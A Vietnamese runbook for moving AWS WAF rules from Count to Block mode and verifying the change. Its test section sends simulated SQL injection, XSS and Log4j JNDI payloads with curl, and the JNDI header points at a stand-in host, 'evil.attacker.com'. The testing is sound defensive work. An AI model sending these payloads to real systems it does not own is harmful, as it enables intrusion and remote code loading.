# 07.04 — Quy Trình Chuyển Đổi An Toàn Count-to-Block & Kiểm Thử Chặn Tấn Công L7

> **Trạng thái:** Hướng dẫn thực hành chi tiết trên AWS Management Console (Console-first).  
> **Áp dụng cho:** Đánh giá độ chính xác của WAF, loại bỏ False-Positive và chuyển đổi an toàn sang chế độ Chặn (Block).

---

## 1. Mục Tiêu Kỹ Thuật

- Phân tích nhật ký WAF trong giai đoạn **Count Mode** để xác nhận lưu lượng người dùng thông thường không bị nhận diện nhầm là tấn công (Zero False-Positives).
- Chuyển đổi trạng thái các quy tắc WAF từ **Count** sang **Block**.
- Kiểm thử gửi các payload tấn công mô phỏng (SQL Injection, XSS, Path Traversal, Log4j).
- Kiểm chứng:
  - Payload độc hại bị trả về mã lỗi **`HTTP 403 Forbidden`**.
  - Lưu lượng gửi quá 500 requests / 5 phút từ 1 IP bị trả về mã lỗi **`HTTP 429 Too Many Requests`**.
  - Toàn bộ hành vi chặn được ghi nhận chi tiết trong CloudWatch WAF Access Logs.

---

## 2. Các Bước Thực Hiện Chi Tiết Trên AWS Console

### Bước 1: Kiểm Tra Nhật Ký WAF Trong Giai Đoạn Đếm (Count Analysis)
1. Mở dịch vụ **AWS WAF & Shield** -> Chọn **Web ACLs** -> Chọn `fabric-edge-web-acl`.
2. Mở tab **CloudWatch metrics**:
   - Quan sát biểu đồ đếm số lượng requests rơi vào từng Rule.
   - Nếu tỷ lệ Count quá cao trên các request hợp lệ -> tinh chỉnh Rule Exclusions.

---

### Bước 2: Chuyển Đổi Sang Chế Độ Chặn (Count-to-Block Transition)
1. Tại Web ACL `fabric-edge-web-acl`, mở tab **Rules** -> Nhấp nút **Edit**.
2. **Chuyển đổi từng Rule Group:**
   - Tại `AWSManagedRulesCommonRuleSet`: Tắt tùy chọn `Set all rule actions to count` (chuyển về hành vi mặc định `Block`).
   - Tại `AWSManagedRulesKnownBadInputsRuleSet`: Tắt `Set all rule actions to count`.
   - Tại `AWSManagedRulesAmazonIpReputationList`: Tắt `Set all rule actions to count`.
   - Tại `fabric-rate-limit-rule`: Chuyển Action từ `Count` sang `Block` (hoặc `CAPTCHA` nếu cần).
3. Nhấp nút **Save**.

---

## 3. Kiểm Thử Thực Tế Các Payload Tấn Công L7

Từ máy trạm kiểm thử ngoài Internet, gửi các request mô phỏng:

### 1. Thử nghiệm tấn công SQL Injection:
```bash
curl -Iv "https://<alb-dns-name>/?username=admin'%20OR%201=1--"
```
> Kết quả: `HTTP/2 403 Forbidden` (AWS WAF chặn đứng lập tức).

### 2. Thử nghiệm tấn công Cross-Site Scripting (XSS):
```bash
curl -Iv "https://<alb-dns-name>/?q=<script>alert('XSS')</script>"
```
> Kết quả: `HTTP/2 403 Forbidden`.

### 3. Thử nghiệm payload Log4j (JNDI Injection):
```bash
curl -Iv -H "User-Agent: \${jndi:ldap://evil.attacker.com/exploit}" "https://<alb-dns-name>/"
```
> Kết quả: `HTTP/2 403 Forbidden`.

---

## 4. Xác Minh Log Trên CloudWatch Logs Insights (Verification)

Truy vấn Log Group của WAF để kiểm chứng:
```sql
fields @timestamp, httpRequest.clientIp, action, terminatingRuleId, httpRequest.uri
| filter action = "BLOCK"
| sort @timestamp desc
| limit 20
```
> Kết quả: Xuất hiện đầy đủ các sự kiện BLOCK kèm tên rule vi phạm (ví dụ `AWSManagedRulesCommonRuleSet`).

---

## 5. Tiêu Chí Nghiệm Thu (Acceptance Criteria)
- [ ] Chuyển đổi thành công sang chế độ Block mà không làm gián đoạn người dùng thông thường.
- [ ] Mọi payload tấn công mô phỏng đều bị chặn đứng với mã lỗi HTTP 403.
- [ ] Nhật ký WAF có đầy đủ bằng chứng sự kiện BLOCK kèm timestamp.

